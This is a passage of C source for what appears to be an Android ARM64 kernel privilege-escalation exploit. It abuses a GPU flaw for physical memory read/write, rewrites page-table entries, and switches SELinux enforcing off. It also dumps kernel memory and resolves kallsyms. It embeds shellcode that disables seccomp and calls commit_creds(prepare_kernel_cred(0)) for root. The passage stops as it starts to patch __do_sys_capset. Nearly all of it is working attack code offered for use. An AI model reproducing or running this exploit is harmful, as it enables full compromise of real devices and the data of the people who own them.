        for (size_t i = 0; i < to_write; i += g_level1_dcache_size) {
            __asm__ volatile("dc cvau, %0" : : "r" ((char*)write_addr + i) : "memory");
        }
        __asm__ volatile("dmb ish" : : : "memory"); // memory barrier

        remaining -= to_write;
        data_buf += to_write;
        current_pa += to_write;
    }
}

static void dump_kernel_memory_fast(struct cheese_gpu_rw* cheese, uint64_t start_pa, uint64_t size, const char* filename) {
    FILE* f = fopen(filename, "wb");
    if (!f) {
        log_info("[-] Failed to open %s for writing", filename);
        return;
    }

    log_info("[+] Dumping %llu bytes from PA %#lx to %s", size, start_pa, filename);

    uint64_t bytes_dumped = 0;
    const uint64_t log_chunk_size = 1024 * 1024; // For logging progress
    const size_t read_chunk_size = PAGE_SIZE; // Read in page-sized chunks
    uint8_t* buffer = (uint8_t*)malloc(read_chunk_size);
    if (!buffer) {
        log_info("[-] Failed to allocate buffer for kernel dump");
        fclose(f);
        return;
    }

    for (uint64_t i = 0; i < size; i += read_chunk_size) {
        uint64_t current_pa = start_pa + i;
        size_t to_read = read_chunk_size;
        if (i + read_chunk_size > size) {
            to_read = size - i;
        }

        // Read into the buffer using fast_pread_u64
        for (size_t j = 0; j < to_read; j += sizeof(uint64_t)) {
            uint64_t val = fast_pread_u64(cheese, current_pa + j);
            memcpy(buffer + j, &val, sizeof(uint64_t));
        }

        fwrite(buffer, 1, to_read, f);

        bytes_dumped += to_read;

        if (bytes_dumped % log_chunk_size == 0) {
            log_info("  Dumped %llu / %llu MB", bytes_dumped / (1024*1024), size / (1024*1024));
        }
    }

    free(buffer);
    fclose(f);
    log_info("[+] Kernel dump complete. Total bytes: %llu", bytes_dumped);
}

static uint64_t estimate_kernel_size(struct cheese_gpu_rw* cheese, uint64_t kernel_base_pa) {
    uint64_t magic = 0;
    if (ReadPhys64(cheese, kernel_base_pa, &magic)) {
        return 32 * 1024 * 1024;
    }

    uint64_t image_size = 0;
    if (ReadPhys64(cheese, kernel_base_pa + 0x10, &image_size)) {
        return 32 * 1024 * 1024;
    }

    if (image_size == 0 || image_size > 0x10000000) {
        return 32 * 1024 * 1024;
    }

    log_info("Kernel image_size from header: 0x%lx (%lu MB)", image_size, image_size / (1024*1024));
    return image_size;
}

// ------------------- Start of stabilization code -------------------

uint64_t kernel_pread_u64(struct cheese_gpu_rw* cheese, uint64_t paddr) {
    uint64_t val = 0;
    if (ReadPhys64(cheese, paddr, &val)) {
        fprintf(stderr, "kernel_pread_u64 failed for addr %lx\n", paddr);
        return 0;
    }
    return val;
}

void kernel_pwrite_u64(struct cheese_gpu_rw* cheese, uint64_t paddr, uint64_t val) {
    uint32_t values[2];
    values[0] = val & 0xFFFFFFFF;
    values[1] = (val >> 32) & 0xFFFFFFFF;

    if (setup_pagetables(cheese->target_physical_page, 1, cheese->phyaddr, kFakeGpuAddr, paddr & ~0xfffull)) {
        fprintf(stderr, "kernel_pwrite_u64: setup_pagetables failed for addr %lx\n", paddr);
        return;
    }
    sync_cache_to_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);

    if (DoWrite(cheese->fd, cheese->ctx_id, cheese->payload_buf, cheese->payload_gpuaddr,
                cheese->phyaddr, kFakeGpuAddr + 0x1100, true,
                kFakeGpuAddr + (paddr & 0xfffull), 2, values)) {
        fprintf(stderr, "kernel_pwrite_u64: DoWrite failed for addr %lx\n", paddr);
        return;
    }
    sleep(1);
    sync_cache_from_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);
    volatile uint32_t* result_marker = cheese->target_physical_page + 0x100;
    if (result_marker[0] != 0x41414141) {
        fprintf(stderr, "kernel_pwrite_u64: marker not set (0x%x)\n", result_marker[0]);
    }
    result_marker[0] = 0;
    sync_cache_to_gpu((void*)result_marker, (void*)(result_marker+1));
}

static void kernel_pwrite_bytes(struct cheese_gpu_rw* cheese, uint64_t paddr, uint32_t* data, uint32_t dword_count) {
    if (setup_pagetables(cheese->target_physical_page, 1, cheese->phyaddr, kFakeGpuAddr, paddr & ~0xfffull)) {
        fprintf(stderr, "kernel_pwrite_bytes: setup_pagetables failed for addr %lx\n", paddr);
        return;
    }
    sync_cache_to_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);

    if (DoWrite(cheese->fd, cheese->ctx_id, cheese->payload_buf, cheese->payload_gpuaddr,
                cheese->phyaddr, kFakeGpuAddr + 0x1100, true,
                kFakeGpuAddr + (paddr & 0xfffull), dword_count, data)) {
        fprintf(stderr, "kernel_pwrite_bytes: DoWrite failed for addr %lx\n", paddr);
        return;
    }
    sleep(1);
    sync_cache_from_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);
    volatile uint32_t* result_marker = cheese->target_physical_page + 0x100;
    if (result_marker[0] != 0x41414141) {
        fprintf(stderr, "kernel_pwrite_bytes: marker not set (0x%x)\n", result_marker[0]);
    }
    result_marker[0] = 0;
    sync_cache_to_gpu((void*)result_marker, (void*)(result_marker+1));
}

// Add validation for 39-bit VA space
static inline bool is_valid_39bit_va(uint64_t va) {
    // For 39-bit VA:
    // User space: 0x0000000000000000 - 0x0000007FFFFFFFFF
    // Kernel space: 0xFFFFFF8000000000 - 0xFFFFFFFFFFFFFFFF

    if (va <= 0x0000007FFFFFFFFFULL) {
        return true;  // User space
    }

    if (va >= 0xFFFFFF8000000000ULL) {
        return true;  // Kernel space
    }

    return false;  // Invalid address in the "hole"
}

uint64_t kernel_va_to_pa(struct cheese_gpu_rw* cheese, uint64_t kva) {
    if (!is_valid_39bit_va(kva)) {
        fprintf(stderr, "kernel_va_to_pa: Invalid 39-bit VA: 0x%lx\n", kva);
        return 0;
    }

    // Always use page table walk with swapper_pg_dir
    if (cheese->swapper_pg_dir_phys == 0) {
        fprintf(stderr, "kernel_va_to_pa: swapper_pg_dir_phys not set\n");
        return 0;
    }

    uint64_t pte_paddr = walk_page_table_for_pte(cheese, cheese->swapper_pg_dir_phys, kva);
    if (!pte_paddr) {
        fprintf(stderr, "kernel_va_to_pa: walk_page_table_for_pte failed for kva 0x%lx\n", kva);
        return 0;
    }

    uint64_t pte_val = kernel_pread_u64(cheese, pte_paddr);
    if (!pte_val || (pte_val & 0x1) == 0) {
        fprintf(stderr, "kernel_va_to_pa: Invalid PTE value 0x%lx at addr 0x%lx\n", pte_val, pte_paddr);
        return 0;
    }

    // Extract physical address from PTE
    uint64_t pa = (pte_val & 0x0000FFFFFFFFF000ULL) | (kva & 0xFFFULL);

    fprintf(stderr, "kernel_va_to_pa: Page table walk: KVA 0x%lx -> PA 0x%lx (PTE=0x%lx)\n",
            kva, pa, pte_val);

    return pa;
}

uint64_t get_curr_task_struct(struct cheese_gpu_rw* cheese) {
    fprintf(stderr, "get_curr_task_struct: Called with cheese: %p, init_task_phys: 0x%lx\n", cheese, cheese->init_task_phys);

    if (cheese->init_task_phys == 0) {
        fprintf(stderr, "get_curr_task_struct: cheese->init_task_phys is 0, cannot traverse task list\n");
        return 0;
    }

    uint64_t init_task_tasks_phys = cheese->init_task_phys + 0x4c8;
    uint64_t current_tasks_member_phys = init_task_tasks_phys;

    int64_t kernel_offset = 0;
    bool kernel_offset_calculated = false;
    int count = 0;

    fprintf(stderr, "Starting task list backward traversal from init_task_phys: 0x%lx\n", cheese->init_task_phys);

    do {
        uint64_t current_task_phys = current_tasks_member_phys - 0x4c8;
        fprintf(stderr, "get_curr_task_struct: Processing task at phys addr: 0x%lx (iteration %d)\n", current_task_phys, count);

        // Read PID (pid is at offset 0x5c8, but it's a 32-bit value, not 64-bit)
        uint64_t pid_addr = current_task_phys + 0x5c8;
        uint64_t pid_64 = 0;
        if (!ReadPhys64(cheese, pid_addr, &pid_64)) {
            // PID is 32-bit, so mask to get just the PID
            uint32_t pid = (uint32_t)(pid_64 & 0xFFFFFFFF);

            // Skip tasks with PID 0 after init (they're kernel threads)
            if (count > 0 && pid == 0) {
                fprintf(stderr, "Skipping kernel thread at phys: 0x%lx\n", current_task_phys);
            } else {
                fprintf(stderr, "Found task PID: %u at phys: 0x%lx\n", pid, current_task_phys);

                if (pid == (uint32_t)getpid()) {
                    fprintf(stderr, "*** Found current process (PID %u) task_struct at physical address: 0x%lx ***\n", pid, current_task_phys);
                    return current_task_phys;
                }
            }
        } else {
            fprintf(stderr, "Could not read PID for task at 0x%lx\n", current_task_phys);
        }

        // Read prev task pointer (this is a kernel VA)
        uint64_t prev_ptr_phys = current_tasks_member_phys + 8; // tasks.prev offset
        uint64_t list_entry_va = 0;
        fprintf(stderr, "get_curr_task_struct: Reading prev task pointer from: 0x%lx\n", prev_ptr_phys);
        if (ReadPhys64(cheese, prev_ptr_phys, &list_entry_va)) {
            fprintf(stderr, "Error reading prev task pointer\n");
            break;
        }

        fprintf(stderr, "Prev task VA in list: 0x%lx\n", list_entry_va);

        // Skip null or invalid pointers
        if (list_entry_va == 0) {
            fprintf(stderr, "Warning: Got null VA, list may be corrupted\n");
            break;
        }

        // Check if this looks like a kernel address
        if ((list_entry_va & 0xffffff0000000000ULL) != 0xffffff0000000000ULL) {
            fprintf(stderr, "Warning: VA 0x%lx doesn't look like a kernel address\n", list_entry_va);
            break;
        }

        // Use kernel_va_to_pa for the first conversion to establish the offset
        uint64_t list_entry_pa;
        if (!kernel_offset_calculated) {
            fprintf(stderr, "Using kernel_va_to_pa for first conversion to establish offset\n");
            list_entry_pa = kernel_va_to_pa(cheese, list_entry_va);
            if (!list_entry_pa) {
                fprintf(stderr, "Failed to convert first VA 0x%lx to PA using page tables\n", list_entry_va);
                break;
            }
            fprintf(stderr, "First conversion: VA 0x%lx -> PA 0x%lx\n", list_entry_va, list_entry_pa);

            // Calculate offset: PA = VA + offset, so offset = PA - VA
            // Use signed arithmetic to handle the subtraction properly
            kernel_offset = (int64_t)list_entry_pa - (int64_t)list_entry_va;
            kernel_offset_calculated = true;
            fprintf(stderr, "Calculated kernel offset: 0x%lx\n", (uint64_t)kernel_offset);
        } else {
            // Use the calculated offset for subsequent conversions
            list_entry_pa = (uint64_t)((int64_t)list_entry_va + kernel_offset);
            fprintf(stderr, "Converted VA 0x%lx to PA 0x%lx using offset\n", list_entry_va, list_entry_pa);
        }

        current_tasks_member_phys = list_entry_pa;
        count++;
    } while (current_tasks_member_phys != init_task_tasks_phys && count < 1000);

    fprintf(stderr, "get_curr_task_struct: Failed to find current task after %d iterations\n", count);
    return 0;
}

static jmp_buf env_jmp_buf;

#include <stdarg.h>

// New functions to match the user's snippet
uint64_t kernel_vread_u64(struct cheese_gpu_rw* ctx, uint64_t kva) {
    uint64_t pa = kernel_va_to_pa(ctx, kva);
    if (!pa) {
        log_info("kernel_vread_u64: failed to convert VA %#lx to PA", kva);
        return 0;
    }
    return kernel_pread_u64(ctx, pa);
}

void kernel_write_u64(struct cheese_gpu_rw* ctx, uint64_t paddr, uint64_t val, bool ignored) {
    kernel_pwrite_u64(ctx, paddr, val);
}

uint64_t get_pgd_offset(uint64_t addr) {
    return ((addr >> 30) & 0x1FF) * sizeof(uint64_t);
}

uint64_t get_pmd_offset(uint64_t addr) {
    return ((addr >> 21) & 0x1FF) * sizeof(uint64_t);
}

uint64_t get_pte_offset(uint64_t addr) {
    return ((addr >> 12) & 0x1FF) * sizeof(uint64_t);
}





static int stabilize_rw(struct cheese_gpu_rw* cheese) {
    struct cheese_gpu_rw* ctx = cheese;

    // Get task_struct PHYSICAL address
    uint64_t tsk = get_curr_task_struct(ctx);
    if (!tsk) {
        log_info("Failed to get current task_struct");
        return 1;
    }
    log_info("Current task_struct physical address: %#lx", tsk);

    // Map a 2MB region, which is likely to be 2MB-aligned. This ensures
    // that the two pages we use from it will not cross a PMD boundary.
    // It also increases the chance of getting physically contiguous pages.
    uint64_t *map = mmap(NULL, 0x200000, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (map == MAP_FAILED) {
        log_info("mmap of 2MB failed: %s", strerror(errno));
        return 1;
    }
    // We only need two pages, so unmap the rest of the 2MB region.
    munmap((char*)map + PAGE_SIZE * 2, 0x200000 - (PAGE_SIZE * 2));

    uint64_t *page_map = (void *)((uint64_t)map + PAGE_SIZE);

    // Touch both pages
    map[0] = 0x4141414141414141;
    page_map[0] = 0x4242424242424242;

    log_info("Mapped pages at %p and %p", map, page_map);

    // Read mm_struct VA from task_struct (tsk is physical address)
    uint64_t mm_va = kernel_pread_u64(ctx, tsk + OFFSETOF_TASK_STRUCT_MM);
    log_info("mm_struct (kernel VA) = %#lx", mm_va);

    if (!mm_va) {
        log_info("mm_struct VA is NULL");
        return 1;
    }

    // Convert mm VA to PA using page table walk
    log_info("Using page table walk to convert mm VA to PA");
    uint64_t mm_pa = kernel_va_to_pa(ctx, mm_va);

    if (!mm_pa) {
        log_info("Failed to convert mm VA %#lx to PA", mm_va);
        return 1;
    }

    log_info("mm_struct PA = %#lx", mm_pa);

    // Read pgd field from mm_struct
    uint64_t pgd_field_pa = mm_pa + OFFSETOF_MM_PGD;
    log_info("Reading pgd from PA %#lx", pgd_field_pa);

    uint64_t mm_pgd_va = kernel_pread_u64(ctx, pgd_field_pa);
    log_info("mm_pgd (kernel VA) = %#lx", mm_pgd_va);

    if (!mm_pgd_va || (mm_pgd_va & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL) {
        log_info("Invalid pgd VA: %#lx", mm_pgd_va);
        return 1;
    }

    // Convert pgd VA to PA
    log_info("Converting pgd VA to PA");
    uint64_t mm_pgd_pa = kernel_va_to_pa(ctx, mm_pgd_va);

    if (!mm_pgd_pa) {
        log_info("Failed to convert pgd VA to PA");
        return 1;
    }

    log_info("mm_pgd PA = %#lx", mm_pgd_pa);


    // Now walk the page table for our userspace mapping
    uint64_t pgd_offset = get_pgd_offset((uint64_t)map);
    log_info("PGD offset for map address %p: %#lx", map, pgd_offset);

    uint64_t pgd_entry = kernel_pread_u64(ctx, mm_pgd_pa + pgd_offset);
    log_info("PGD entry = %#lx", pgd_entry);

    if ((pgd_entry & 0x3) != 0x3) {
        log_info("Invalid PGD entry");
        return 1;
    }

    uint64_t phys_pmd_addr = pgd_entry & 0x0000FFFFFFFFF000ULL;
    uint64_t pmd_offset = get_pmd_offset((uint64_t)map);
    uint64_t pmd_entry = kernel_pread_u64(ctx, phys_pmd_addr + pmd_offset);
    log_info("PMD entry = %#lx", pmd_entry);

    if ((pmd_entry & 0x1) == 0 || (pmd_entry & 0x3) == 0x1) {
        log_info("Invalid or block PMD entry");
        return 1;
    }

    uint64_t phys_pte_addr = pmd_entry & 0x0000FFFFFFFFF000ULL;
    uint64_t pte_offset_a = get_pte_offset((uint64_t)map);
    uint64_t pte_addr_a = phys_pte_addr + pte_offset_a;
    uint64_t pte_addr_b = pte_addr_a + 8;

    log_info("PTE addr A: %#lx, PTE addr B: %#lx", pte_addr_a, pte_addr_b);
    log_info("PTE table physical address: %#lx", phys_pte_addr);

    uint64_t pte_a = kernel_pread_u64(ctx, pte_addr_a);
    uint64_t pte_b = kernel_pread_u64(ctx, pte_addr_b);

    log_info("Checking PTEs for both pages:");
    log_info("PTE A = %#lx, PTE B = %#lx", pte_a, pte_b);

    if (pte_a == 0 || pte_b == 0) {
        log_info("ERROR: PTE is 0");
        return 1;
    }

    // Extract physical addresses from PTEs for verification
    uint64_t pa_from_pte_a = pte_a & 0x0000FFFFFFFFF000ULL;
    uint64_t pa_from_pte_b = pte_b & 0x0000FFFFFFFFF000ULL;
    log_info("Physical address from PTE A: %#lx", pa_from_pte_a);
    log_info("Physical address from PTE B: %#lx", pa_from_pte_b);

    // The exploit requires that the PTEs for both pages are in the same PTE table.
    // This is true if the virtual addresses don't cross a 2MB boundary.
    uint64_t map_pte_region = (uint64_t)map & ~0x1FFFFFULL;
    uint64_t page_map_pte_region = (uint64_t)page_map & ~0x1FFFFFULL;

    if (map_pte_region != page_map_pte_region) {
        log_info("ERROR: The mapped pages cross a 2MB boundary, placing them in different PTE tables. Aborting.");
        return 1;
    } else {
        log_info("yes both are in same pagetable (PTE)");
    }

    // For diagnostic purposes, log whether the underlying physical pages are consecutive.
    if ((pa_from_pte_b - pa_from_pte_a) != 0x1000) {
        log_info("WARNING: Physical pages are not consecutive. Difference: %#lx.", pa_from_pte_b - pa_from_pte_a);
    } else {
        log_info("INFO: Physical pages are consecutive.");
    }

    // Corrupt PTE B to point to the PTE table
    uint64_t new_pte_b = pte_b;

    // Clear the physical address field [47:12]
    new_pte_b &= ~0x0000FFFFFFFFF000ULL;

    // Set new physical address (the PTE table address)
    uint64_t pte_table_pa = phys_pte_addr & ~0xFFFULL;
    new_pte_b |= (pte_table_pa & 0x0000FFFFFFFFF000ULL);

    // Make it writable - clear AP[2] (bit 7), set AP[1] (bit 6)
    new_pte_b &= ~(1ULL << 7);
    new_pte_b |= (1ULL << 6);

    // Also ensure AF (Access Flag) is set
    new_pte_b |= (1ULL << 10);

    log_info("Original PTE B: %#lx", pte_b);
    log_info("New PTE B:      %#lx", new_pte_b);
    log_info("  Physical addr field: %#lx -> %#lx",
             pte_b & 0x0000FFFFFFFFF000ULL,
             new_pte_b & 0x0000FFFFFFFFF000ULL);
    log_info("  AP bits [7:6]: %#lx -> %#lx",
             (pte_b >> 6) & 0x3,
             (new_pte_b >> 6) & 0x3);

    // Verify the new PTE looks valid before writing
    if ((new_pte_b & 0x3) != 0x3) {
        log_info("ERROR: New PTE is not a valid page descriptor!");
        return 1;
    }

    log_info("About to write new PTE to %#lx", pte_addr_b);
    log_info("This will make page_map (at %p) point to the PTE table", page_map);

    // Use the setup_pagetables + DoWrite approach for safer write
    if (setup_pagetables(ctx->target_physical_page, 1, ctx->phyaddr,
                        kFakeGpuAddr, pte_addr_b & ~0xfffull)) {
        log_info("setup_pagetables failed");
        return 1;
    }
    sync_cache_to_gpu(ctx->target_physical_page, ctx->target_physical_page + 0x1000);

    uint32_t values[2];
    values[0] = new_pte_b & 0xFFFFFFFF;
    values[1] = (new_pte_b >> 32) & 0xFFFFFFFF;

    log_info("Writing PTE as two dwords: %#x %#x", values[0], values[1]);

    if (DoWrite(ctx->fd, ctx->ctx_id, ctx->payload_buf, ctx->payload_gpuaddr,
                ctx->phyaddr, kFakeGpuAddr + 0x1100, true,
                kFakeGpuAddr + (pte_addr_b & 0xfffull), 2, values)) {
        log_info("DoWrite failed");
        return 1;
    }

    log_info("Write submitted, waiting for completion...");
    sleep(1);

    sync_cache_from_gpu(ctx->target_physical_page, ctx->target_physical_page + 0x1000);
    volatile uint32_t* result_marker = ctx->target_physical_page + 0x100;
    if (result_marker[0] != 0x41414141) {
        log_info("Write completion marker not set: %#x", result_marker[0]);
        return 1;
    }

    uint64_t read_back_pte;
    if (ReadPhys64(ctx, pte_addr_b, &read_back_pte)) {
        log_info("Failed to read back PTE from %#lx", pte_addr_b);
    } else {
        log_info("Read back PTE from %#lx: %#lx", pte_addr_b, read_back_pte);
    }

    fprintf(stderr, "pte wait 3 second show countdown\n");
    for (int i = 3; i > 0; i--) {
        fprintf(stderr, "%d ", i);
        sleep(1);
    }
    fprintf(stderr, "\n");

    log_info("Write completed successfully");

    // Clear marker
    result_marker[0] = 0;
    sync_cache_to_gpu((void*)result_marker, (void*)(result_marker+1));

    // Disable SELinux
    uint64_t idmap_pg_dir_phys = ctx->swapper_pg_dir_phys - 0x5000;

    log_info("Attempting to disable SELinux...");
    log_info("idmap_pg_dir_phys: %#lx", idmap_pg_dir_phys);

    // selinux_state is at offset 0x5c4b88 from idmap_pg_dir
    // This is the STRUCTURE ITSELF, not a pointer to it
    uint64_t selinux_state_offset = 0x5c4b88;
    uint64_t selinux_state_phys = idmap_pg_dir_phys + selinux_state_offset;

    log_info("selinux_state physical address: %#lx", selinux_state_phys);
    log_info("(calculated as idmap_pg_dir_phys + 0x%lx)", selinux_state_offset);

    // The 'enforcing' field is at offset 0 of struct selinux_state
    // Read the current value (first 8 bytes to be safe)
    log_info("Reading current selinux_state enforcing field from physical address %#lx", selinux_state_phys);
    uint64_t original_val = kernel_pread_u64(ctx, selinux_state_phys);
    log_info("Original 64-bit value at selinux_state: %#lx", original_val);
    log_info("  enforcing (byte 0): %d", (int)(original_val & 0xFF));
    log_info("  checkreqprot (byte 1): %d", (int)((original_val >> 8) & 0xFF));
    log_info("  initialized (byte 2): %d", (int)((original_val >> 16) & 0xFF));

    // Set enforcing (first byte) to 0, preserve other fields
    uint64_t new_val = original_val & 0xFFFFFFFFFFFFFF00ULL;
    log_info("New 64-bit value to write: %#lx", new_val);

    log_info("Writing modified value to physical address %#lx using PTE mapping", selinux_state_phys);

    // Get index for page A's PTE from its virtual address
    uint64_t pte_index_a = ((uint64_t)map >> 12) & 0x1FF;

    // Create a new PTE pointing to the physical page of selinux_state
    uint64_t selinux_pte = phys_to_readwrite_pte(selinux_state_phys);
    log_info("Original PTE A: %#lx", pte_a);
    log_info("New PTE for selinux_state page: %#lx", selinux_pte);

    // Overwrite PTE A to point to the selinux page
    page_map[pte_index_a] = selinux_pte;
    flush_tlb();
    log_info("PTE A overwritten. map should now point to selinux_state's page.");

    // Calculate the address to write to.
    // map's VA now maps to selinux_state's physical page.
    // We need to add the page offset of selinux_state_phys.
    uint64_t selinux_page_offset = selinux_state_phys & 0xFFF;
    volatile uint64_t* selinux_addr_mapped = (uint64_t*)((char*)map + selinux_page_offset);

    log_info("Writing new value %#lx to mapped address %p", new_val, selinux_addr_mapped);
    *selinux_addr_mapped = new_val;
    __asm__ volatile("dmb ish" : : : "memory"); // memory barrier

    // Verify via CPU read before restoring PTE
    log_info("CPU verification read from mapped address %p", selinux_addr_mapped);
    uint64_t cpu_verify = *selinux_addr_mapped;
    log_info("CPU verification read: %#lx", cpu_verify);
    log_info("  enforcing (byte 0): %d", (int)(cpu_verify & 0xFF));

    // Restore original PTE for page A
    page_map[pte_index_a] = pte_a;
    flush_tlb();
    log_info("Restored original PTE A.");

    if ((cpu_verify & 0xFF) == 0) {
        log_info("SUCCESS: SELinux enforcing disabled!");
    } else {
        log_info("WARNING: SELinux enforcing may not have been disabled (still reads as %d)",
                 (int)(cpu_verify & 0xFF));
    }

    ctx->garbage = map;
    ctx->pte_a_index = pte_offset_a / sizeof(uint64_t);
    ctx->pte_addr_b = pte_addr_b;
    ctx->original_pte_b = pte_b;

    // Initialize fast RW for kallsyms parsing
    if (init_fast_rw(ctx)) {
        log_info("Failed to initialize fast RW");
        return 1;
    }

    return 0;
}

// ------------------- End of stabilization code -------------------

static void stupid_memcpy(void* dst, void* src, size_t n) {
    for (size_t i = 0; i < n; i++) {
        ((char*)dst)[i] = ((char*)src)[i];
    }
}

static void stupid_setexeccon(const char* ctx) {
    int fd = open("/proc/self/attr/exec", O_WRONLY);
    if (fd < 0) return;
    write(fd, ctx, strlen(ctx));
    close(fd);
}

static void maybe_retry(char** argv) {
    char* attempt = getenv("CHEESE_ATTEMPT");
    int attempt_num = attempt? atoi(attempt): 0;
    int new_attempt = attempt_num + 1;
    if (new_attempt < sizeof(gPhyAddrs) / sizeof(*gPhyAddrs)) {
        char new_attempt_str[10];
        snprintf(new_attempt_str, sizeof(new_attempt_str), "%d", new_attempt);
        setenv("CHEESE_ATTEMPT", new_attempt_str, true);
        execv("/proc/self/exe", argv);
    }
}

int main(int argc, char** argv) {
    g_level1_dcache_size = tu_get_l1_dcache_size();
    fprintf(stderr, "Current process PID: %d\n", getpid());

    bool force_manual_patchfinder = getenv("CHEESE_FORCE_MANUAL_PATCHFINDER") != NULL;

    if (!getenv("CHEESE_SKIP_GPU")) {
        struct cheese_gpu_rw cheese = {};
        cheese.fd = 0;
        cheese.ctx_id = 0;
        cheese.payload_buf = NULL;
        cheese.payload_gpuaddr = 0;
        cheese.output_buf = NULL;
        cheese.output_gpuaddr = 0;
        cheese.target_physical_page = NULL;
        cheese.phyaddr = 0;
        cheese.garbage = NULL;
        cheese.swapper_pg_dir_phys = 0;
        cheese.init_task_phys = 0;
        cheese.pte_a_index = 0;
        cheese.pte_addr_b = 0;
        cheese.original_pte_b = 0;
        cheese.kernel_base_pa = 0;
        cheese.kernel_size = 0;


        if (cheese_gpu_rw_setup(&cheese)) {
            fprintf(stderr, "can't get GPU r/w\n");
            if (!getenv("CHEESE_NO_RETRY")) {
                maybe_retry(argv);
            }
            return 1;
        }
        if (stabilize_rw(&cheese)) {
            fprintf(stderr, "stabilize_rw failed\n");
            return 1;
        }

        log_info("\n[=== SELinux disabled, setting up kallsyms ===]");

        // Determine kernel size for kallsyms parsing
        cheese.kernel_size = estimate_kernel_size(&cheese, cheese.kernel_base_pa);
        log_info("Kernel size: 0x%lx (%lu MB)", cheese.kernel_size, cheese.kernel_size / (1024*1024));

        // Allocate buffer to read kernel into
        void* kernel_data = malloc(cheese.kernel_size);
        if (!kernel_data) {
            log_info("Failed to allocate kernel buffer");
            return 1;
        }

        log_info("Reading kernel from PA 0x%lx into buffer at %p", cheese.kernel_base_pa, kernel_data);

        // Read kernel memory using fast_pread_u64 in page-sized chunks
        const size_t read_chunk_size = PAGE_SIZE;
        uint8_t* temp_buffer = (uint8_t*)malloc(read_chunk_size);
        if (!temp_buffer) {
            log_info("Failed to allocate temporary buffer for kernel read");
            free(kernel_data);
            return 1;
        }

        for (uint64_t i = 0; i < cheese.kernel_size; i += read_chunk_size) {
            uint64_t current_pa = cheese.kernel_base_pa + i;
            size_t to_read = read_chunk_size;
            if (i + read_chunk_size > cheese.kernel_size) {
                to_read = cheese.kernel_size - i;
            }

            // Read into the temporary buffer using fast_pread_u64
            for (size_t j = 0; j < to_read; j += sizeof(uint64_t)) {
                uint64_t val = fast_pread_u64(&cheese, current_pa + j);
                memcpy(temp_buffer + j, &val, sizeof(uint64_t));
            }

            // Copy from temporary buffer to kernel_data
            memcpy((char*)kernel_data + i, temp_buffer, to_read);

            if (i % (1024*1024) == 0 && i > 0) {
                log_info("  Read %lu / %lu MB", i / (1024*1024), cheese.kernel_size / (1024*1024));
            }
        }
        free(temp_buffer);

        log_info("Kernel read complete");

        // Save kernel to file before parsing to prevent panics.
        const char *dump_filename = "kernel.dump";
        FILE *dump_file = fopen(dump_filename, "wb");
        if (dump_file) {
            log_info("Saving kernel to %s...", dump_filename);
            fwrite(kernel_data, 1, cheese.kernel_size, dump_file);
            fclose(dump_file);
            log_info("Kernel saved.");
        } else {
            log_info("Failed to open %s for writing.", dump_filename);
        }

        // Parse kallsyms
        struct cheese_kallsyms_lookup kallsyms_lookup = {};
        log_info("Parsing kallsyms from buffer...");
        if (cheese_create_kallsyms_lookup(&kallsyms_lookup, kernel_data, cheese.kernel_size)) {
            log_info("Failed to parse kallsyms");
            free(kernel_data);
            return 1;
        }

        log_info("Kallsyms parsed successfully");

        // Get actual kernel virtual base from _text symbol
        uint64_t kernel_text_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "_text");
        if (!kernel_text_addr) {
            kernel_text_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "_stext");
        }
        log_info("Kernel _text virtual address: %#lx", kernel_text_addr);

        if (!kernel_text_addr) {
            log_info("Failed to find kernel text base");
            free(kernel_data);
            return 1;
        }

        // Calculate the offset between virtual and physical
        // kernel_text_addr is the virtual address where kernel starts
        // cheese.kernel_base_pa is the physical address where kernel starts
        int64_t va_to_pa_offset = (int64_t)cheese.kernel_base_pa - (int64_t)kernel_text_addr;
        log_info("VA to PA offset: %#lx", (uint64_t)va_to_pa_offset);

        uint64_t init_cred_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "init_cred");
        if (force_manual_patchfinder || !init_cred_addr) {
            init_cred_addr = cheese_lookup_init_cred(&kallsyms_lookup);
        }
        uint64_t commit_creds_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "commit_creds");

        log_info("init_cred virtual address: %#lx", init_cred_addr);
        log_info("commit_creds virtual address: %#lx", commit_creds_addr);

        uint64_t prepare_kernel_cred_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "prepare_kernel_cred");
        log_info("prepare_kernel_cred virtual address: %#lx", prepare_kernel_cred_addr);
        if (force_manual_patchfinder || !prepare_kernel_cred_addr) {
            fprintf(stderr, "Can't find prepare_kernel_cred\n");
            return 1;
        }

#define LO_DWORD(a) (a & 0xffffffff)
#define HI_DWORD(a) (a >> 32)

        uint32_t shellcode[] = {
            0xd503233f,  // paciasp
            0xa9bf7bfd,  // stp x29, x30, [sp, #-16]!
            0x910003fd,  // mov x29, sp

            // Disable seccomp
            0xd5384100,  // mrs x0, sp_el0
            0xf9400001,  // ldr x1, [x0]
            0x9274f821,  // and x1, x1, #0xfffffffffffff7ff
            0xf9000001,  // str x1, [x0]
            0xf904241f,  // str xzr, [x0, #0x848]
            0xf904281f,  // str xzr, [x0, #0x850]

            // Call prepare_kernel_cred(0)
            0xd2800000,  // mov x0, #0
            0x58000041,  // ldr x1, #8
            0x14000003,  // b +12
            LO_DWORD(prepare_kernel_cred_addr),
            HI_DWORD(prepare_kernel_cred_addr),
            0xd63f0020,  // blr x1

            // Call commit_creds(result)
            0x58000041,  // ldr x1, #8
            0x14000003,  // b +12
            LO_DWORD(commit_creds_addr),
            HI_DWORD(commit_creds_addr),
            0xd63f0020,  // blr x1

            // Restore and return
            0x2a1f03e0,  // mov w0, wzr
            0xa8c17bfd,  // ldp x29, x30, [sp], #16
            0xd50323bf,  // autiasp
            0xd65f03c0,  // ret
        };

        uint64_t kernel___do_sys_capset_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "__do_sys_capset");
        log_info("__do_sys_capset virtual address: %#lx", kernel___do_sys_capset_addr);

        // Convert virtual address to physical
        uint64_t kernel___do_sys_capset_pa = (uint64_t)((int64_t)kernel___do_sys_capset_addr + va_to_pa_offset);
        log_info("__do_sys_capset physical address: %#lx", kernel___do_sys_capset_pa);

                /* Saving sys_capset current code using GPU reads */
